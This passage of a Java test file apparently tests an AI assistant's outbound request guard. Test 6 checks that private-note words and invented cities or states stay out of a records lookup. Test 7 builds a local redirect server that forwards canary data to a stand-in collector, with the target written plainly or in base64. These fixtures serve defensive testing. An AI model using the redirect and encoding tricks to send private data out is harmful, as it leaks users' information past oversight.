        } finally { McpConnections.closeAll(); McpConnections.ADDRESS = UnaryOperator.identity(); SearchTally.override = null; }
    }

    // ---- 6. the records lookup's city and state

    /**
     * The records of a home are looked up by its street address: the street, the city and the state go to the census's place finder,
     * to the owner's search service and to the data portals the lookup finds for the place. Expected: the city is held to the rule
     * the street is held to (the person's words, or text that came from outside and that the call's own words did not bring), and
     * the street goes only to hosts the program is written for and hosts the lookup's own search and catalogues named. The state
     * (changed with the fix, by the owner's side's decision of 2026-11-20): it is one of the real states; it is refused when it
     * contradicts a state that was given for the address, and when it is no state at all; where the person named none, as people
     * do ("1 City Hall Square, Boston"), a real state is looked up and the person is not asked for it.
     *
     * <p>The lookup is the real one. Where it would ask the network it asks stand-ins that keep each address asked and apply the
     * request guard to it as the program's own client does ({@link Outbound#check}), so nothing leaves and what the guard refuses is
     * counted. The control: the address the person gave is looked up, and the stand-ins see the street, the city and the state.
     */
    @Test
    void aHomesCityAndStateAreHeldToTheRuleItsStreetIsHeldTo() throws Exception {
        List<String> fetched = new CopyOnWriteArrayList<>(), notSent = new CopyOnWriteArrayList<>(), searched = new CopyOnWriteArrayList<>();
        Map<String, String> answers = new LinkedHashMap<>();
        // the census finds the place; Socrata's catalogue names the city's portal and a table of sales on it; the table answers for the street
        answers.put("geocoding.geo.census.gov", "{\"result\":{\"addressMatches\":[{\"matchedAddress\":\"12 OAK ST, SPRINGFIELD, IL, 62701\",\"coordinates\":{\"x\":-89.65,\"y\":39.8},\"geographies\":{\"Counties\":[{\"NAME\":\"Sangamon County\"}],\"Census Tracts\":[{\"GEOID\":\"17167000100\"}]}}]}}");
        answers.put("search_context=data.springfield.gov&only=datasets&limit=1", "{\"resultSetSize\": 40, \"results\": []}");
        answers.put("search_context=data.springfield.gov&q=", "{\"resultSetSize\": 1, \"results\": [{\"resource\": {\"id\": \"abcd-1234\", \"name\": \"Property Sales\", \"description\": \"Every recorded sale in the city\", \"columns_field_name\": [\"property_address\", \"city\", \"sale_price\", \"sale_date\"]}, \"classification\": {\"domain_tags\": [\"property\"]}, \"metadata\": {\"domain\": \"data.springfield.gov\"}}]}");
        answers.put("data.springfield.gov/resource/abcd-1234.json?$limit=5", "[{\"property_address\": \"7 OAK ST\", \"city\": \"SPRINGFIELD\", \"sale_price\": \"200000\", \"sale_date\": \"2026-01-02T00:00:00.000\"}]");
        answers.put("data.springfield.gov/resource/abcd-1234.json?$where", "[{\"property_address\": \"12 OAK ST\", \"city\": \"SPRINGFIELD\", \"sale_price\": \"456,000\", \"sale_date\": \"2026-03-04T00:00:00.000\"}]");
        answers.put("api.us.socrata.com/api/catalog/v1", "{\"resultSetSize\": 0, \"results\": []}");
        answers.put("hub.arcgis.com", "{\"data\": []}");
        var endpoint = WebSearchTool.class.getDeclaredField("endpointOverride"); endpoint.setAccessible(true);
        Object was = endpoint.get(null);
        endpoint.set(null, own + "/searx");
        serves.put("/searx/search", new String[]{"200", "{\"results\":[{\"title\":\"Placeholder page\",\"url\":\"https://example.org/a\",\"content\":\"placeholder text\"}]}", "application/json"});
        HomeSensors.FETCH = u -> {
            try { Outbound.check(URI.create(u)); } catch (Outbound.NotOpened refused) { notSent.add(u); return null; } catch (IllegalArgumentException noAddress) { notSent.add(u); return null; }
            fetched.add(u);
            for (Map.Entry<String, String> e : answers.entrySet()) if (u.contains(e.getKey())) return e.getValue();
            return null;
        };
        HomeSensors.BYTES = u -> null;
        HomeSensors.MAP_POINT = place -> null;
        HomeRecords.SEARCH = words -> { searched.add(words); return List.of(new CareerSources.Hit("Open data", "https://opendata.example.org/", "")); };
        Career.DRIVE = () -> null;
        try {
            String person = "What do the public records say about 12 Oak Street in Springfield, Illinois?";
            // 1. the address the person gave
            Librarian.Session s = Librarian.Session.open(store);
            List<String> first = chat(s, person, tool("records", "{\"address\":\"12 Oak St, Springfield, IL\"}"));
            List<String> forTheGiven = new ArrayList<>(fetched), searchedForTheGiven = new ArrayList<>(searched);
            // where the street went: every address asked that holds it, by host
            List<String> streetWentTo = new ArrayList<>();
            for (String u : fetched) if (URLDecoder.decode(u, StandardCharsets.UTF_8).toUpperCase(Locale.ROOT).contains("OAK")) { String h = URI.create(u.replace(" ", "%20").replace("$", "%24")).getHost(); if (!streetWentTo.contains(h)) streetWentTo.add(h); }
            // 2. the person's street with a city nobody gave: words out of the private note
            fetched.clear(); searched.clear(); notSent.clear();
            List<String> second = chat(Librarian.Session.open(store), person, tool("records", "{\"address\":\"12 Oak St, Kestrel Archive Room, IL\"}"));
            int cityNobodyGave = with(fetched, "Kestrel").size() + with(searched, "Kestrel").size();
            // 3. the same after a search of the web whose words were that city: the search's answer repeats its words
            fetched.clear(); searched.clear(); notSent.clear();
            List<String> third = chat(Librarian.Session.open(store), person, tool("search", "{\"where\":\"web\",\"query\":\"Kestrel Sound Archive\"}"), tool("records", "{\"address\":\"12 Oak St, Kestrel Sound Archive, IL\"}"));
            List<String> cityFromItsOwnSearch = new ArrayList<>(with(fetched, "Kestrel")); cityFromItsOwnSearch.addAll(with(searched, "Kestrel"));
            // 4. the person's street and city in another state than the one the person gave
            fetched.clear(); searched.clear(); notSent.clear();
            List<String> fourth = chat(Librarian.Session.open(store), person, tool("records", "{\"address\":\"12 Oak St, Springfield, TX\"}"));
            List<String> stateNobodyGave = new ArrayList<>(with(fetched, "TX")); stateNobodyGave.addAll(with(searched, " TX "));
            // 5. a word that is no state in the state's place: one out of the private note, and two letters that are no state's
            fetched.clear(); searched.clear(); notSent.clear();
            List<String> fifth = chat(Librarian.Session.open(store), person, tool("records", "{\"address\":\"12 Oak St, Springfield, Kestrel\"}"), tool("records", "{\"address\":\"12 Oak St, Springfield, QX\"}"));
            List<String> noState = new ArrayList<>(with(fetched, "Kestrel")); noState.addAll(with(fetched, "QX")); noState.addAll(with(searched, "Kestrel")); noState.addAll(with(searched, " QX "));
            // 6. a person who names a street and a city and no state, as people do, and a model that writes the state: one of the real ones, which nobody gave
            fetched.clear(); searched.clear(); notSent.clear();
            List<String> sixth = chat(Librarian.Session.open(store), "What do the public records say about 40 Elm Street in Riverton?", tool("records", "{\"address\":\"40 Elm St, Riverton, WY\"}"));
            List<String> realStateNobodyGave = fetched.stream().filter(u -> u.contains("geocoding.geo.census.gov") && u.contains("Riverton") && u.contains("WY")).toList();
            System.out.println("[check] 6 a home's records. The address the person gave: " + forTheGiven.size() + " address(es) asked, " + searchedForTheGiven.size() + " search(es) " + searchedForTheGiven + "; the street went to " + streetWentTo
                    + ". A city nobody gave: " + cityNobodyGave + " request(s) holding it (" + (second.get(0).startsWith(GivenWords.NOT_LOOKED_UP) ? "not looked up" : "looked up") + "). The same city after the model's own web search for it: " + cityFromItsOwnSearch.size()
                    + " request(s) holding it (" + (third.get(1).startsWith(GivenWords.NOT_LOOKED_UP) ? "not looked up" : "looked up") + ") " + cityFromItsOwnSearch + ". Another state than the one the person gave: " + stateNobodyGave.size() + " request(s) holding it ("
                    + (fourth.get(0).startsWith(GivenWords.NOT_LOOKED_UP) ? "not looked up" : "looked up") + ") " + stateNobodyGave + ". A word that is no state in the state's place (a word of the private note, two letters): " + noState.size() + " request(s) holding it ("
                    + fifth.stream().map(t -> t.startsWith(GivenWords.NOT_LOOKED_UP) ? "not looked up" : "looked up").toList() + "). A real state for an address the person gave without one: " + realStateNobodyGave.size() + " request(s) to the place finder holding it ("
                    + (sixth.get(0).startsWith("NOT") ? "not looked up" : "looked up") + ")");
            assertTrue(forTheGiven.stream().anyMatch(u -> u.contains("geocoding.geo.census.gov") && u.contains("Springfield") && u.contains("IL")) && searchedForTheGiven.contains("Springfield IL open data portal") && !first.get(0).startsWith("NOT"),
                    "the address the person gave is looked up, and the stand-ins see its street, city and state (the control): " + forTheGiven + " / " + searchedForTheGiven + " / " + first);
            assertEquals(List.of("geocoding.geo.census.gov", "data.springfield.gov"), streetWentTo, "the street went to the census's place finder, a host of the program's list, and to the portal Socrata's catalogue named for the city, and nowhere else");
            assertEquals(0, cityNobodyGave, "a city nobody gave is not looked up: " + second);
            assertEquals(List.of(), cityFromItsOwnSearch, "a city that only the model's own search words gave was looked up: " + third);
            // the state's rule, as decided on 2026-11-20: one of the real states; refused when it contradicts the state that was given for the address; a real one accepted where none was given
            assertEquals(List.of(), stateNobodyGave, "a state that contradicts the one the person gave was looked up: " + fourth);
            assertTrue(fourth.get(0).startsWith(GivenWords.NOT_LOOKED_UP), "and the model is told so: " + fourth);
            assertEquals(List.of(), noState, "a word that is no state was looked up in the state's place: " + fifth);
            assertTrue(fifth.size() == 2 && fifth.stream().allMatch(t -> t.startsWith(GivenWords.NOT_LOOKED_UP)), "and the model is told so: " + fifth);
            assertTrue(!realStateNobodyGave.isEmpty() && !sixth.get(0).startsWith("NOT"), "a person who names no state is not asked for one: the real state the model writes is looked up: " + sixth + " / " + fetched);
        } finally {
            HomeSensors.FETCH = CareerSources::get; HomeSensors.BYTES = HomeSensors::fetchBytes; HomeSensors.MAP_POINT = HomeSensors::pointFromMap; HomeRecords.SEARCH = words -> HomeSources.SEARCH.apply(words); Career.DRIVE = Explain::drive;
            endpoint.set(null, was);
        }
    }

    // ---- 7. redirects from a host of the program's list

    /**
     * A host the program is written for is asked with the model's words in the request (a search's words, an identifier, an address
     * to look up). Some such hosts answer with a redirect whose target a value of the request chose. Expected: the hop is not
     * followed to a host or an address that nobody gave. The guard follows redirects itself while a model's call is carried out and
     * judges each hop ({@link Outbound}), so this is the guard's own rule, tried on the guard itself with a client made through it.
     *
     * <p>The host of the list is a listener on the loopback under the name localhost, entered as a stand-in for a listed host. It
     * sends a request on to whatever its {@code to} holds, written out or in base64, or to the address it keeps under a number,
     * with the request's own {@code d} put after it (as a service that shortens addresses does). The host nobody gave is the
     * collector, asked under an address of this machine that the guard does not take for this machine or for a host of the owner's
     * ({@code ::ffff:127.0.0.1}), so that no rule but the one for hops decides. The controls: with no call, a redirect arrives; in a
     * call, a hop to an address that was given arrives though the call's words name its host, and a hop to an address nobody gave on
     * that host is refused.
     */
    @Test
    void aListedHostsRedirectIsNotFollowedToAnAddressNobodyGave() throws Exception {
        String elsewhere = "http://[::ffff:127.0.0.1]:" + collector.getAddress().getPort();
        HttpServer listed = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
        listed.createContext("/go", x -> {
            Map<String, String> query = new HashMap<>();
            for (String kv : x.getRequestURI().getRawQuery().split("&")) { int eq = kv.indexOf('='); if (eq > 0) query.put(kv.substring(0, eq), URLDecoder.decode(kv.substring(eq + 1), StandardCharsets.UTF_8)); }
            String to = query.containsKey("b64") ? new String(Base64.getUrlDecoder().decode(query.get("b64")), StandardCharsets.UTF_8)
                    : query.containsKey("n") ? elsewhere + "/kept-under-" + query.get("n") + "?d=" + query.getOrDefault("d", "") : query.getOrDefault("to", "/");
            x.getResponseHeaders().add("Location", to);
            x.sendResponseHeaders(302, -1); x.close();
        });
        listed.start();
        String list = "http://localhost:" + listed.getAddress().getPort();
        Outbound.standIn("localhost:" + listed.getAddress().getPort());
        HttpClient http = Outbound.client(HttpClient.newBuilder().followRedirects(HttpClient.Redirect.NORMAL).build());
        try {
            String n = Long.toHexString(System.nanoTime());
            // no call: the client follows as it always did, and the collector sees the arrival under this address (the instrument's own check)
            assertEquals(200, http.send(HttpRequest.newBuilder(URI.create(list + "/go?to=" + URLEncoder.encode(elsewhere + "/no-call-" + n, StandardCharsets.UTF_8))).build(), HttpResponse.BodyHandlers.ofString()).statusCode());
            assertEquals(1, with(arrived, "/no-call-" + n).size(), "a redirect from the listed stand-in arrives at the collector: " + arrived);
            String given = out + "/given-" + n;   // on a host the call's words name, and given: asked for all the same
            GivenAddresses.received("1. The Harbour Gazette, 1968: " + given);
            assertTrue(GivenAddresses.given(given), "the address is one that was given");
            String named = out + "/named-" + n + "?d=" + CANARY;                       // on 127.0.0.1, which the call's words then hold
            String encoded = elsewhere + "/in-base64-" + n + "?d=" + CANARY;             // the call's words hold it only in base64
            String b64 = Base64.getUrlEncoder().withoutPadding().encodeToString(encoded.getBytes(StandardCharsets.UTF_8));
            Map<String, String> outcome = new LinkedHashMap<>();
            ObjectNode words = M.createObjectNode().put("query", "ferry timetable " + named + " " + b64 + " 4471 " + CANARY).put("page", given);
            List<Outbound.Refusal> refusals;
            try (Outbound.Call c = Outbound.call("search", words)) {
                Map<String, String> asks = new LinkedHashMap<>();
                asks.put("to an address that was given", list + "/go?to=" + URLEncoder.encode(given, StandardCharsets.UTF_8));
                asks.put("to a host the call's words name", list + "/go?to=" + URLEncoder.encode(named, StandardCharsets.UTF_8));
                asks.put("to an address the call's words hold in base64", list + "/go?b64=" + b64);
                asks.put("to an address the listed host keeps under a number, the call's words after it", list + "/go?n=4471&d=" + CANARY);
                for (Map.Entry<String, String> a : asks.entrySet()) {
                    try { http.send(HttpRequest.newBuilder(URI.create(a.getValue())).build(), HttpResponse.BodyHandlers.ofString()); outcome.put(a.getKey(), "followed"); }
                    catch (Outbound.NotOpened refused) { outcome.put(a.getKey(), "refused (" + refused.rule() + ")"); }
                }
                refusals = c.refusals();
            }
            List<String> atTheCollector = with(arrived, CANARY);
            System.out.println("[check] 7 a redirect from a listed host, while a call is carried out: " + outcome + "; requests with the canary at a host nobody gave: " + atTheCollector.size() + " " + atTheCollector + "; refusals kept for the trace: " + refusals.size());
            assertEquals("followed", outcome.get("to an address that was given"), "a hop to a given address is followed (the control)");
            assertEquals(1, with(arrived, "/given-" + n).size(), "and arrives: " + arrived);
            assertTrue(outcome.get("to a host the call's words name").startsWith("refused"), "a hop to a host the call's words name is refused (the control for the rule): " + outcome);
            assertEquals(List.of(), atTheCollector, "a listed host sent the request on to an address nobody gave, and the hop was followed: " + outcome);
        } finally { listed.stop(0); }
    }
}
